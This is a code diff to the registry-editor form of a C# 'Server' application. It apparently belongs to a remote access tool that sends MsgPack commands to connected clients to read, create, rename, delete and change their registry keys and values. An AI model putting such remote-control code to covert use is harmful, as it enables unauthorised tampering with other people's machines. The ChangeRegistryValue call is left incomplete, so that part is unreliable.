@@ -19,93 +19,22 @@ namespace Server.Forms
         internal Clients ParentClient { get; set; }
 
 
+
+
         public FormRegistryEditor()
         {
             InitializeComponent();
         }
 
-        /// <summary>
-        /// Registers the registry editor handler for client communication.
-        /// </summary>
-        //private void RegisterMessageHandler()
-        //{
-        //    _connectClient.ClientState += ClientDisconnected;
-        //    _registryHandler.ProgressChanged += ShowErrorMessage;
-        //    _registryHandler.KeysReceived += AddKeys;
-        //    _registryHandler.KeyCreated += CreateNewKey;
-        //    _registryHandler.KeyDeleted += DeleteKey;
-        //    _registryHandler.KeyRenamed += RenameKey;
-        //    _registryHandler.ValueCreated += CreateValue;
-        //    _registryHandler.ValueDeleted += DeleteValue;
-        //    _registryHandler.ValueRenamed += RenameValue;
-        //    _registryHandler.ValueChanged += ChangeValue;
-        //    MessageHandler.Register(_registryHandler);
-        //}
-
-        /// <summary>
-        /// Unregisters the registry editor message handler.
-        /// </summary>
-        //private void UnregisterMessageHandler()
-        //{
-        //    MessageHandler.Unregister(_registryHandler);
-        //    _registryHandler.ProgressChanged -= ShowErrorMessage;
-        //    _registryHandler.KeysReceived -= AddKeys;
-        //    _registryHandler.KeyCreated -= CreateNewKey;
-        //    _registryHandler.KeyDeleted -= DeleteKey;
-        //    _registryHandler.KeyRenamed -= RenameKey;
-        //    _registryHandler.ValueCreated -= CreateValue;
-        //    _registryHandler.ValueDeleted -= DeleteValue;
-        //    _registryHandler.ValueRenamed -= RenameValue;
-        //    _registryHandler.ValueChanged -= ChangeValue;
-        //    _connectClient.ClientState -= ClientDisconnected;
-        //}
-
-        /// <summary>
-        /// Called whenever a client disconnects.
-        /// </summary>
-        /// <param name="client">The client which disconnected.</param>
-        /// <param name="connected">True if the client connected, false if disconnected</param>
-        //private void ClientDisconnected(Client client, bool connected)
-        //{
-        //    if (!connected)
-        //    {
-        //        this.Invoke((MethodInvoker)this.Close);
-        //    }
-        //}
-        
-
-        protected override CreateParams CreateParams
-        {
-            get
-            {
-                CreateParams cp = base.CreateParams;
-                cp.ExStyle |= 0x02000000; //WS_EX_COMPOSITED
-                return cp;
-            }
-        }
-
         private void FrmRegistryEditor_Load(object sender, EventArgs e)
         {
-            if (Client.Admin != true)
+            if (ParentClient.Admin != true)
             {
                 MessageBox.Show(
                     "The client software is not running as administrator and therefore some functionality like Update, Create, Open and Delete may not work properly!",
                     "Alert!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
             }
-
-            //this.Text = GetWindowTitle("Registry Editor", _connectClient);
-
-            // signal client to retrive the root nodes (indicated by null)
-
-            MsgPack msgpack = new MsgPack();
-            msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
-            msgpack.ForcePathObject("Command").AsString = "LoadRegistryKey";
-            msgpack.ForcePathObject("RootKeyName").AsString = "";
-            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
-            //LoadRegistryKey(null);
         }
-
-        #region TreeView helper functions
 
         private void AddRootKey(RegSeekerMatch match)
         {
@@ -163,7 +92,7 @@ namespace Server.Forms
             }
         }
 
-        private void CreateNewKey(object sender, string rootKey, RegSeekerMatch match)
+        public void CreateNewKey(string rootKey, RegSeekerMatch match)
         {
             TreeNode parent = GetTreeNode(rootKey);
 
@@ -177,7 +106,7 @@ namespace Server.Forms
             node.BeginEdit();
         }
 
-        private void DeleteKey(object sender, string rootKey, string subKey)
+        public void DeleteKey(string rootKey, string subKey)
         {
             TreeNode parent = GetTreeNode(rootKey);
 
@@ -186,7 +115,7 @@ namespace Server.Forms
             }
         }
 
-        private void RenameKey(object sender, string rootKey, string oldName, string newName)
+        public void RenameKey(string rootKey, string oldName, string newName)
         {
             TreeNode parent = GetTreeNode(rootKey);
 
@@ -221,11 +150,10 @@ namespace Server.Forms
             return lastNode;
         }
 
-        #endregion
 
         #region ListView helper functions
 
-        private void CreateValue(object sender, string keyPath, RegValueData value)
+        public void CreateValue(string keyPath, RegValueData value)
         {
             TreeNode key = GetTreeNode(keyPath);
 
@@ -250,7 +178,7 @@ namespace Server.Forms
             }
         }
 
-        private void DeleteValue(object sender, string keyPath, string valueName)
+        public void DeleteValue(string keyPath, string valueName)
         {
             TreeNode key = GetTreeNode(keyPath);
 
@@ -281,7 +209,7 @@ namespace Server.Forms
             }
         }
 
-        private void RenameValue(object sender, string keyPath, string oldName, string newName)
+        public void RenameValue(string keyPath, string oldName, string newName)
         {
             TreeNode key = GetTreeNode(keyPath);
 
@@ -302,7 +230,7 @@ namespace Server.Forms
             }
         }
 
-        private void ChangeValue(object sender, string keyPath, RegValueData value)
+        public void ChangeValue(string keyPath, RegValueData value)
         {
             TreeNode key = GetTreeNode(keyPath);
 
@@ -378,7 +306,13 @@ namespace Server.Forms
                     }
                     else
                     {
-                        //RenameRegistryKey(e.Node.Parent.FullPath, e.Node.Name, e.Label);
+                        MsgPack msgpack = new MsgPack();
+                        msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
+                        msgpack.ForcePathObject("Command").AsString = "RenameRegistryKey";
+                        msgpack.ForcePathObject("OldKeyName").AsString = e.Node.Name;
+                        msgpack.ForcePathObject("NewKeyName").AsString = e.Label;
+                        msgpack.ForcePathObject("ParentPath").AsString = e.Node.Parent.FullPath;
+                        ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                         tvRegistryDirectory.LabelEdit = false;
                     }
                 }
@@ -405,8 +339,14 @@ namespace Server.Forms
                 tvRegistryDirectory.SuspendLayout();
                 parentNode.Nodes.Clear();
 
-                //LoadRegistryKey(parentNode.FullPath);
 
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
+                msgpack.ForcePathObject("Command").AsString = "LoadRegistryKey";
+                msgpack.ForcePathObject("RootKeyName").AsString = parentNode.FullPath;
+                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
+
+                Thread.Sleep(500);
                 tvRegistryDirectory.ResumeLayout();
 
                 e.Cancel = true;
@@ -550,7 +490,13 @@ namespace Server.Forms
                         return;
                     }
 
-                    //RenameRegistryValue(tvRegistryDirectory.SelectedNode.FullPath,lstRegistryValues.Items[index].Name, e.Label);
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
+                    msgpack.ForcePathObject("Command").AsString = "RenameRegistryValue";
+                    msgpack.ForcePathObject("OldValueName").AsString = lstRegistryValues.Items[index].Name;
+                    msgpack.ForcePathObject("NewValueName").AsString = e.Label;
+                    msgpack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
+                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                     lstRegistryValues.LabelEdit = false;
                 }
                 else
@@ -586,7 +532,11 @@ namespace Server.Forms
             }
             else
             {
-                //CreateRegistryKey(tvRegistryDirectory.SelectedNode.FullPath);
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
+                msgpack.ForcePathObject("Command").AsString = "CreateRegistryKey";
+                msgpack.ForcePathObject("ParentPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
+                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
             }
         }
 
@@ -603,11 +553,10 @@ namespace Server.Forms
 
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
-                msgpack.ForcePathObject("Command").AsString = "deleteRegistryKey";
+                msgpack.ForcePathObject("Command").AsString = "DeleteRegistryKey";
                 msgpack.ForcePathObject("KeyName").AsString = tvRegistryDirectory.SelectedNode.Name;
                 msgpack.ForcePathObject("ParentPath").AsString = parentPath;
                 ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
-                //DeleteRegistryKey(parentPath, tvRegistryDirectory.SelectedNode.Name);
             }
         }
 
@@ -624,7 +573,12 @@ namespace Server.Forms
             if (tvRegistryDirectory.SelectedNode != null)
             {
                 // request the creation of a new Registry value of type REG_SZ
-                //CreateRegistryValue(tvRegistryDirectory.SelectedNode.FullPath,RegistryValueKind.String);
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
+                msgpack.ForcePathObject("Command").AsString = "CreateRegistryValue";
+                msgpack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
+                msgpack.ForcePathObject("Kindstring").AsString = "1";//RegistryValueKind.String
+                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
             }
         }
 
@@ -633,7 +587,12 @@ namespace Server.Forms
             if (tvRegistryDirectory.SelectedNode != null)
             {
                 // request the creation of a new Registry value of type REG_BINARY
-                //CreateRegistryValue(tvRegistryDirectory.SelectedNode.FullPath,RegistryValueKind.Binary);
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
+                msgpack.ForcePathObject("Command").AsString = "CreateRegistryValue";
+                msgpack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
+                msgpack.ForcePathObject("Kindstring").AsString = "3";//RegistryValueKind.Binary
+                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
             }
         }
 
@@ -642,7 +601,12 @@ namespace Server.Forms
             if (tvRegistryDirectory.SelectedNode != null)
             {
                 // request the creation of a new Registry value of type REG_DWORD
-                //CreateRegistryValue(tvRegistryDirectory.SelectedNode.FullPath,RegistryValueKind.DWord);
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
+                msgpack.ForcePathObject("Command").AsString = "CreateRegistryValue";
+                msgpack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
+                msgpack.ForcePathObject("Kindstring").AsString = "4";//RegistryValueKind.DWord
+                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
             }
         }
 
@@ -651,7 +615,12 @@ namespace Server.Forms
             if (tvRegistryDirectory.SelectedNode != null)
             {
                 // request the creation of a new Registry value of type REG_QWORD
-                //CreateRegistryValue(tvRegistryDirectory.SelectedNode.FullPath,RegistryValueKind.QWord);
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
+                msgpack.ForcePathObject("Command").AsString = "CreateRegistryValue";
+                msgpack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
+                msgpack.ForcePathObject("Kindstring").AsString = "11";//RegistryValueKind.QWord
+                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
             }
         }
 
@@ -660,7 +629,12 @@ namespace Server.Forms
             if (tvRegistryDirectory.SelectedNode != null)
             {
                 // request the creation of a new Registry value of type REG_MULTI_SZ
-                //CreateRegistryValue(tvRegistryDirectory.SelectedNode.FullPath,RegistryValueKind.MultiString);
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
+                msgpack.ForcePathObject("Command").AsString = "CreateRegistryValue";
+                msgpack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
+                msgpack.ForcePathObject("Kindstring").AsString = "7";//RegistryValueKind.MultiString
+                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
             }
         }
 
@@ -669,7 +643,12 @@ namespace Server.Forms
             if (tvRegistryDirectory.SelectedNode != null)
             {
                 // request the creation of a new Registry value of type REG_EXPAND_SZ
-                //CreateRegistryValue(tvRegistryDirectory.SelectedNode.FullPath,RegistryValueKind.ExpandString);
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
+                msgpack.ForcePathObject("Command").AsString = "CreateRegistryValue";
+                msgpack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
+                msgpack.ForcePathObject("Kindstring").AsString = "2";//RegistryValueKind.ExpandString
+                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
             }
         }
 
@@ -691,7 +670,12 @@ namespace Server.Forms
                     if (item.GetType() == typeof(RegistryValueLstItem))
                     {
                         RegistryValueLstItem registryValue = (RegistryValueLstItem) item;
-                        //DeleteRegistryValue(tvRegistryDirectory.SelectedNode.FullPath, registryValue.RegName);
+                        MsgPack msgpack = new MsgPack();
+                        msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
+                        msgpack.ForcePathObject("Command").AsString = "DeleteRegistryValue";
+                        msgpack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
+                        msgpack.ForcePathObject("ValueName").AsString = registryValue.RegName;
+                        ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                     }
                 }
             }
@@ -780,6 +764,12 @@ namespace Server.Forms
                 if (frm.ShowDialog() == DialogResult.OK)
                 {
                     //ChangeRegistryValue(keyPath, (RegValueData) frm.Tag);
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
+                    msgpack.ForcePathObject("Command").AsString = "ChangeRegistryValue";
+                    //msgpack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
+                    //msgpack.ForcePathObject("Kindstring").AsString = "11";
+                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                 }
             }
         }
@@ -790,7 +780,7 @@ namespace Server.Forms
         {
             try
             {
-                if (!Client.TcpClient.Connected) this.Close();
+                if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected) this.Close();
             }
             catch { this.Close(); }
         }
